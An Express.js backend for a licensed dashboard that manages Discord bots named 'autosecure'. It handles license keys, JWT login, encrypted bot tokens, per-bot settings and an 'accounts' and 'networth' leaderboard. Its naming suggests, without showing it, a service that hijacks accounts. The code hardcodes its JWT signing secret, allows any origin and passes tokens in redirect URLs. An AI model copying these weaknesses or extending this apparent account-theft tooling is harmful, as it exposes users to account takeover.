const express = require('express');
const path = require('path');
let queryParams;
let dbError = null;

try {
  queryParams = require('../db/database.js').queryParams;
  console.log('✅ Database module loaded');
} catch (err) {
  console.error('❌ Error loading database:', err.message);
  dbError = err;
}

const jwt = require('jsonwebtoken');
const axios = require('axios');
const config = require('../config.json');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { Client: DjClient, GatewayIntentBits } = require('discord.js');
// users cache helper to fetch Discord user info when we only have an ID
let usersCacheGetUser = null;
try {
  usersCacheGetUser = require('../db/usersCache').getUser;
} catch (e) {
  console.warn('usersCache module not available:', e.message || e);
}

const app = express();
const SECRET_KEY = 'autosecure-license-key-secret-2024';
const BOT_TOKEN_SECRET = process.env.BOT_TOKEN_SECRET || config.jwtsecret || SECRET_KEY;

function encryptToken(plain) {
  const iv = crypto.randomBytes(12);
  const key = crypto.createHash('sha256').update(BOT_TOKEN_SECRET).digest();
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const encrypted = Buffer.concat([cipher.update(plain, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, encrypted]).toString('base64');
}

function decryptToken(data) {
  const b = Buffer.from(data, 'base64');
  const iv = b.slice(0, 12);
  const tag = b.slice(12, 28);
  const encrypted = b.slice(28);
  const key = crypto.createHash('sha256').update(BOT_TOKEN_SECRET).digest();
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
  decipher.setAuthTag(tag);
  return Buffer.concat([decipher.update(encrypted), decipher.final()]).toString('utf8');
}

// Validate a Discord bot token by attempting a short-lived login
async function validateDiscordToken(token, timeoutMs = 8000) {
  if (!token) return false;
  const client = new DjClient({ intents: [GatewayIntentBits.Guilds] });
  let finished = false;
  return new Promise((resolve) => {
    const timer = setTimeout(async () => {
      if (!finished) {
        finished = true;
        try { await client.destroy(); } catch (e) {}
        resolve(false);
      }
    }, timeoutMs);

    client.once('ready', async () => {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      try { await client.destroy(); } catch (e) {}
      resolve(true);
    });

    client.once('error', (err) => {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      try { client.destroy(); } catch (e) {}
      resolve(false);
    });

    client.login(token).catch(() => {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      try { client.destroy(); } catch (e) {}
      resolve(false);
    });
  });
}

// Try to hot-reload a bot if the main process exposes autosecureMap
async function hotReloadBot(botId) {
  try {
    const botRows = await queryParams('SELECT * FROM autosecure WHERE id = ? LIMIT 1', [botId]);
    if (!botRows || botRows.length === 0) return false;
    const bot = botRows[0];
    const autosecurePath = '../mainbot/handlers/botHandler';
    let handler;
    try {
      handler = require(autosecurePath);
    } catch (e) {
      console.log('Hot-reload: mainbot not loaded in this process, skipping in-process reload');
      return false;
    }

    const { autosecureMap } = handler;
    const key = `${bot.user_id}|${bot.botnumber}`;
    if (!autosecureMap || !autosecureMap.has(key)) {
      console.log('Hot-reload: bot not running in this process');
      return false;
    }

    // destroy existing client
    const existing = autosecureMap.get(key);
    try { await existing.destroy(); } catch (e) { console.warn('Error destroying existing bot client', e); }

    // decrypt token and re-initialize
    const decrypted = bot.token ? decryptToken(bot.token) : null;
    if (!decrypted) {
      console.log('Hot-reload: no token available to restart bot');
      autosecureMap.delete(key);
      return false;
    }

    const autosecureModule = require('../autosecure/autosecure');
    const newClient = await autosecureModule(decrypted, bot.user_id, bot.botnumber);
    if (newClient) {
      autosecureMap.set(key, newClient);
      console.log(`Hot-reload: bot ${key} reconnected`);
      return true;
    }
    return false;
  } catch (err) {
    console.error('Hot-reload error', err);
    return false;
  }
}

app.use(express.json());
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Middleware temporal para añadir una CSP permisiva durante pruebas locales
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src 'self' https: data: 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https: data:; style-src 'self' 'unsafe-inline' https:");
  next();
});

// Servir archivos estáticos desde la carpeta web/public/
app.use(express.static(path.join(__dirname, 'public')));

// Ruta raíz - redirije a login
app.get('/', (req, res) => {
  res.redirect('/login');
});

// Ruta de login
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Ruta del dashboard
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Validar license key
app.post('/api/validate-license', async (req, res) => {
  if (dbError) {
    return res.status(500).json({ success: false, message: 'Database error: ' + dbError.message });
  }
  try {
    const license = req.body.license || req.body.key;
    
    if (!license || typeof license !== 'string') {
      return res.status(400).json({ success: false, message: 'License key required' });
    }

    // Buscar en usedLicenses (licencias ya activadas)
    let licenseData = await queryParams('SELECT * FROM usedLicenses WHERE license = ?', [license]);
    
    if (licenseData && licenseData.length > 0) {
      const { user_id, expiry } = licenseData[0];
      const expiryDate = new Date(expiry);
      const now = new Date();

      if (expiryDate < now) {
        return res.json({ success: false, message: 'License expired', expired: true });
      }

      const token = jwt.sign({ license, userId: user_id }, SECRET_KEY, { expiresIn: '30d' });
      return res.json({ 
        success: true,
        token,
        userId: user_id,
        expiresAt: expiry
      });
    }

    // Buscar en licenses (sin usar aún)
    licenseData = await queryParams('SELECT * FROM licenses WHERE license = ?', [license]);
    
    if (licenseData && licenseData.length > 0) {
      const { duration } = licenseData[0];
      const expiryDate = new Date(Date.now() + duration * 24 * 60 * 60 * 1000);
      
      // Activar la licencia
      await queryParams('INSERT INTO usedLicenses (license, user_id, expiry) VALUES (?, ?, ?)', 
        [license, 'user_' + Date.now(), expiryDate.toISOString()]);
      
      const token = jwt.sign({ license, userId: 'user_' + Date.now() }, SECRET_KEY, { expiresIn: '30d' });
      return res.json({ 
        success: true,
        token,
        userId: 'user_' + Date.now(),
        expiresAt: expiryDate.toISOString(),
        firstTime: true
      });
    }

    return res.status(401).json({ success: false, message: 'Invalid license key' });

  } catch (error) {
    console.error('Validation error:', error.message);
    res.status(500).json({ success: false, message: 'Server error: ' + error.message });
  }
});

// Verificar token
app.post('/api/verify-token', (req, res) => {
  try {
    const { token } = req.body;
    if (!token) {
      return res.status(401).json({ success: false, message: 'No token provided' });
    }

    const decoded = jwt.verify(token, SECRET_KEY);
    return res.json({ success: true, userId: decoded.userId, license: decoded.license });
  } catch (err) {
    return res.status(401).json({ success: false, message: 'Invalid token' });
  }
});

// Obtener datos del usuario
app.get('/api/user-data', async (req, res) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) {
      return res.status(401).json({ success: false, message: 'No token' });
    }

    const decoded = jwt.verify(token, SECRET_KEY);
    const userId = decoded.userId;
    const accounts = await queryParams('SELECT * FROM accounts WHERE user_id = ? ORDER BY id DESC', [userId]);
    const settings = await queryParams('SELECT * FROM settings WHERE user_id = ?', [userId]);
    const licenseInfo = await queryParams('SELECT * FROM usedLicenses WHERE user_id = ?', [userId]);
    const slotsRow = await queryParams('SELECT slots FROM slots WHERE user_id = ?', [userId]);
    const slots = (slotsRow && slotsRow[0] && typeof slotsRow[0].slots !== 'undefined') ? slotsRow[0].slots : 0;
    // also return autosecure "bots" owned by this user (exclude tokens)
    const bots = await queryParams('SELECT id, botnumber, lastsavedname as name, creationdate, server_id, prefix, pfp, logs_channel FROM autosecure WHERE user_id = ?', [userId]);

    // Try to attach Discord profile info when we have a usersCache helper
    let discordUser = null;
    try {
      if (usersCacheGetUser) {
        // Prefer the token's userId if it looks like a Discord ID (numeric), otherwise try the usedLicenses row
        let candidateId = null;
        console.log('user-data: usersCache available, evaluating candidate id for discord lookup, userId=', userId);
        if (/^\d+$/.test(String(userId))) {
          candidateId = String(userId);
        } else if (licenseInfo && licenseInfo[0] && /^\d+$/.test(String(licenseInfo[0].user_id))) {
          candidateId = String(licenseInfo[0].user_id);
        }
        console.log('user-data: candidateId=', candidateId);
        if (candidateId) {
          console.log('user-data: attempting usersCacheGetUser for', candidateId);
          const fetched = await usersCacheGetUser(candidateId);
          console.log('user-data: usersCacheGetUser returned', fetched && fetched.username ? fetched.username : fetched);
          if (fetched && fetched.username) {
            discordUser = fetched;
            discordUser.resolved = true;
          }
        }
      }
    } catch (e) {
      console.warn('Failed to fetch discord user from cache:', e && e.message ? e.message : e);
    }

    // Ensure we always return a minimal discordUser fallback so frontend has consistent shape
    if (!discordUser) {
      const fallback = { username: null, avatar: null, discord_id: null, resolved: false };
      if (licenseInfo && licenseInfo[0] && licenseInfo[0].user_id) {
        fallback.discord_id = String(licenseInfo[0].user_id);
        // If it's numeric, we know it's a Discord ID but we couldn't fetch details
        fallback.username = /^\d+$/.test(fallback.discord_id) ? 'Discord User' : 'License Holder';
      } else if (/^\d+$/.test(String(userId))) {
        fallback.discord_id = String(userId);
        fallback.username = 'Discord User';
      } else {
        fallback.username = 'License Holder';
      }
      fallback.avatar = (config && config.defaultpfp) ? config.defaultpfp : null;
      discordUser = fallback;
    }
    // ensure resolved flag exists for successfully fetched users
    if (discordUser && typeof discordUser.resolved === 'undefined') discordUser.resolved = !!(discordUser && discordUser.username && discordUser.discord_id);

    return res.json({
      success: true,
      userId,
      accounts: accounts || [],
      settings: settings?.[0] || {},
      bots: bots || [],
      license: licenseInfo?.[0] || {},
      slots: slots,
      discordUser: discordUser
    });
  } catch (error) {
    console.error('User data error:', error.message);
    res.status(500).json({ success: false, message: 'Error: ' + error.message });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ success: true, message: 'API is running' });
});

// Return main dashboard config (safe subset)
app.get('/api/config', (req, res) => {
  try {
    const safe = { dashboard: config.dashboard || {} };
    return res.json({ success: true, config: safe, dashboard: safe.dashboard });
  } catch (err) {
    return res.status(500).json({ success: false, message: 'Error reading config' });
  }
});

// Public leaderboard for unauthenticated visitors
app.get('/api/public/leaderboard', async (req, res) => {
  try {
    const rows = await queryParams('SELECT user_id, networth, amount FROM leaderboard ORDER BY networth DESC LIMIT 20');
    return res.json({ success: true, leaderboard: rows || [] });
  } catch (err) {
    console.error('Leaderboard error', err);
    return res.status(500).json({ success: false, message: 'Error fetching leaderboard' });
  }
});

// List user's bots
app.get('/api/bots', async (req, res) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ success: false, message: 'No token' });
    const decoded = jwt.verify(token, SECRET_KEY);
    const userId = decoded.userId;
    const bots = await queryParams('SELECT id, botnumber, lastsavedname as name, creationdate, server_id, prefix, pfp, logs_channel FROM autosecure WHERE user_id = ?', [userId]);
    return res.json({ success: true, bots: bots || [] });
  } catch (err) {
    console.error('Bots error', err.message || err);
    return res.status(500).json({ success: false, message: 'Error fetching bots' });
  }
});

// Rate limiters
const generalLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 200 }); // 200 per 15 minutes per IP
const sensitiveLimiter = rateLimit({ windowMs: 60 * 60 * 1000, max: 8 }); // 8 per hour per IP for sensitive endpoints

app.use('/api/', generalLimiter);

// Get per-bot config (no token returned)
app.get('/api/bot/:id/config', async (req, res) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ success: false, message: 'No token' });
    const decoded = jwt.verify(token, SECRET_KEY);
    const userId = decoded.userId;
    const botId = req.params.id;
    const rows = await queryParams('SELECT * FROM autosecure WHERE id = ? LIMIT 1', [botId]);
    if (!rows || rows.length === 0) return res.status(404).json({ success: false, message: 'Bot not found' });
    const bot = rows[0];
    if (String(bot.user_id) !== String(userId)) return res.status(403).json({ success: false, message: 'Not owner' });

    // only expose safe fields
    const safe = {
      id: bot.id,
      name: bot.lastsavedname,
      botnumber: bot.botnumber,
      prefix: bot.prefix,
      pfp: bot.pfp,
      logsChannel: bot.logs_channel,
      domain: bot.domain,
      auto_secure: bot.auto_secure
    };
    return res.json({ success: true, config: safe });
  } catch (err) {
    console.error('Get bot config error', err.message || err);
    return res.status(500).json({ success: false, message: 'Error' });
  }
});

// Admin: get audit logs (admin only)
app.get('/api/admin/audit', async (req, res) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ success: false, message: 'No token' });
    const decoded = jwt.verify(token, SECRET_KEY);
    const userId = decoded.userId;
    // check admin
    if (!config.owners || !config.owners.includes(String(userId))) return res.status(403).json({ success: false, message: 'Not admin' });

    const { user, bot, action, since, until, limit = 100 } = req.query;
    const params = [];
    let where = '1=1';
    if (user) { where += ' AND user_id = ?'; params.push(user); }
    if (bot) { where += ' AND bot_id = ?'; params.push(bot); }
    if (action) { where += ' AND action = ?'; params.push(action); }
    if (since) { where += ' AND time >= ?'; params.push(Number(since)); }
    if (until) { where += ' AND time <= ?'; params.push(Number(until)); }

    const rows = await queryParams(`SELECT * FROM audit_logs WHERE ${where} ORDER BY time DESC LIMIT ?`, [...params, Number(limit)]);
    return res.json({ success: true, logs: rows || [] });
  } catch (err) {
    console.error('Admin audit error', err);
    return res.status(500).json({ success: false, message: 'Error' });
  }
});

// User: get my audit logs
app.get('/api/me/audit', async (req, res) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ success: false, message: 'No token' });
    const decoded = jwt.verify(token, SECRET_KEY);
    const userId = decoded.userId;

    const { limit = 100 } = req.query;
    const rows = await queryParams('SELECT * FROM audit_logs WHERE user_id = ? ORDER BY time DESC LIMIT ?', [userId, Number(limit)]);
    return res.json({ success: true, logs: rows || [] });
  } catch (err) {
    console.error('Me audit error', err);
    return res.status(500).json({ success: false, message: 'Error' });
  }
});

// Check if authenticated user is admin
app.get('/api/is-admin', (req, res) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.json({ success: true, isAdmin: false });
    const decoded = jwt.verify(token, SECRET_KEY);
    const userId = decoded.userId;
    const isAdmin = Array.isArray(config.owners) && config.owners.includes(String(userId));
    return res.json({ success: true, isAdmin });
  } catch (err) {
    return res.json({ success: true, isAdmin: false });
  }
});

// Update per-bot config (safe fields only)
app.post('/api/bot/:id/config', sensitiveLimiter, async (req, res) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ success: false, message: 'No token' });
    const decoded = jwt.verify(token, SECRET_KEY);
    const userId = decoded.userId;
    const botId = req.params.id;
    const rows = await queryParams('SELECT * FROM autosecure WHERE id = ? LIMIT 1', [botId]);
    if (!rows || rows.length === 0) return res.status(404).json({ success: false, message: 'Bot not found' });
    const bot = rows[0];
    if (String(bot.user_id) !== String(userId)) return res.status(403).json({ success: false, message: 'Not owner' });

    const allowed = {};
    // Map incoming fields to DB columns only if those columns exist on the bot row
    const map = {
      name: 'lastsavedname',
      enableAutoSecure: 'auto_secure',
      logsChannel: 'logs_channel',
      useCatchAll: 'use_catchall',
      prefix: 'prefix',
      pfp: 'pfp',
      domain: 'domain',
      postSecureAction: 'post_secure_action'
    };

    Object.keys(map).forEach(k => {
      if (typeof req.body[k] === 'undefined') return;
      const col = map[k];
      if (!Object.prototype.hasOwnProperty.call(bot, col)) return; // skip if DB doesn't have the column
      let val = req.body[k];
      if (k === 'enableAutoSecure') val = req.body[k] ? 1 : 0;
      if (k === 'logsChannel' && !val) val = null;
      allowed[col] = val;
    });

    // build update
    const keys = Object.keys(allowed);
    if (keys.length === 0) return res.status(400).json({ success: false, message: 'No valid fields' });
    const setClause = keys.map(k => `${k} = ?`).join(', ');
    const params = keys.map(k => allowed[k]);
    params.push(botId);
    await queryParams(`UPDATE autosecure SET ${setClause} WHERE id = ?`, params);

    // audit log
    try {
      await queryParams('INSERT INTO audit_logs (user_id, bot_id, action, details, ip, time) VALUES (?, ?, ?, ?, ?, ?)',
        [userId, botId, 'update_config', JSON.stringify(allowed), req.ip, Date.now()]);
    } catch (auditErr) {
      console.warn('Failed to write audit log', auditErr);
    }

    return res.json({ success: true, message: 'Saved' });
  } catch (err) {
    console.error('Save bot config error', err.message || err);
    return res.status(500).json({ success: false, message: 'Error saving' });
  }
});

// Store/update encrypted bot token (server will not return token)
app.post('/api/bot/:id/token', sensitiveLimiter, async (req, res) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ success: false, message: 'No token' });
    const decoded = jwt.verify(token, SECRET_KEY);
    const userId = decoded.userId;
    const botId = req.params.id;
    const { botToken } = req.body;
    if (!botToken || typeof botToken !== 'string') return res.status(400).json({ success: false, message: 'Missing botToken' });

    const rows = await queryParams('SELECT * FROM autosecure WHERE id = ? LIMIT 1', [botId]);
    if (!rows || rows.length === 0) return res.status(404).json({ success: false, message: 'Bot not found' });
    const bot = rows[0];
    if (String(bot.user_id) !== String(userId)) return res.status(403).json({ success: false, message: 'Not owner' });

    // validate token before persisting
    const valid = await validateDiscordToken(botToken);
    if (!valid) return res.status(400).json({ success: false, message: 'Invalid bot token' });

    const encrypted = encryptToken(botToken);
    await queryParams('UPDATE autosecure SET token = ? WHERE id = ?', [encrypted, botId]);

    // audit log
    try {
      await queryParams('INSERT INTO audit_logs (user_id, bot_id, action, details, ip, time) VALUES (?, ?, ?, ?, ?, ?)',
        [userId, botId, 'update_token', 'token_changed', req.ip, Date.now()]);
    } catch (auditErr) {
      console.warn('Failed to write audit log', auditErr);
    }

    // attempt hot-reload in-process (best-effort)
    const reloaded = await hotReloadBot(botId);
    console.log(`Bot ${botId} token updated by user ${userId} (hot-reload=${reloaded})`);
    return res.json({ success: true, message: 'Token saved.' , hotReload: reloaded});
  } catch (err) {
    console.error('Save token error', err.message || err);
    return res.status(500).json({ success: false, message: 'Error saving token' });
  }
});

// Discord OAuth start - redirects user to Discord authorization
app.get('/auth/discord', (req, res) => {
  const clientId = config.discordClientId;
  if (!clientId) return res.status(500).send('Discord OAuth not configured. Add discordClientId to config.json');
  const redirectUri = `${req.protocol}://${req.get('host')}/auth/discord/callback`;
  const scope = 'identify';
  const url = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${encodeURIComponent(scope)}`;
  res.redirect(url);
});

// Discord OAuth callback - exchanges code for token and checks license
app.get('/auth/discord/callback', async (req, res) => {
  const code = req.query.code;
  const clientId = config.discordClientId;
  const clientSecret = config.discordClientSecret;

  if (!code || !clientId || !clientSecret) {
    return res.status(400).send('Missing OAuth configuration or code');
  }

  const redirectUri = `${req.protocol}://${req.get('host')}/auth/discord/callback`;

  try {
    const params = new URLSearchParams();
    params.append('client_id', clientId);
    params.append('client_secret', clientSecret);
    params.append('grant_type', 'authorization_code');
    params.append('code', code);
    params.append('redirect_uri', redirectUri);

    const tokenResp = await axios.post('https://discord.com/api/oauth2/token', params.toString(), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });

    const accessToken = tokenResp.data.access_token;
    const me = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${accessToken}` }
    });

    const discordId = me.data.id;

    // Buscar licencia asociada a este Discord ID
    const rows = await queryParams('SELECT * FROM usedLicenses WHERE user_id = ? ORDER BY expiry DESC LIMIT 1', [discordId]);

    if (rows && rows.length > 0) {
      const row = rows[0];
      const expiry = new Date(row.expiry);
      if (expiry > new Date()) {
        const token = jwt.sign({ userId: discordId, license: row.license }, SECRET_KEY, { expiresIn: '30d' });
        return res.redirect(`/?auth_token=${token}`);
      } else {
        return res.redirect('/?auth_error=expired');
      }
    } else {
      return res.redirect('/?auth_error=no_license');
    }

  } catch (err) {
    console.error('OAuth callback error:', err?.response?.data || err.message || err);
    return res.status(500).send('OAuth error');
  }
});

// Manejador de errores global
app.use((err, req, res, next) => {
  console.error('Error:', err.message);
  res.status(500).json({ success: false, message: 'Server error: ' + err.message });
});

const PORT = process.env.PORT || 3001;

try {
  const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ API Server running on port ${PORT}`);
  });

  // Manejador para errores no capturados
  process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
    process.exit(1);
  });

  process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  });
} catch (error) {
  console.error('Failed to start server:', error.message);
  process.exit(1);
}
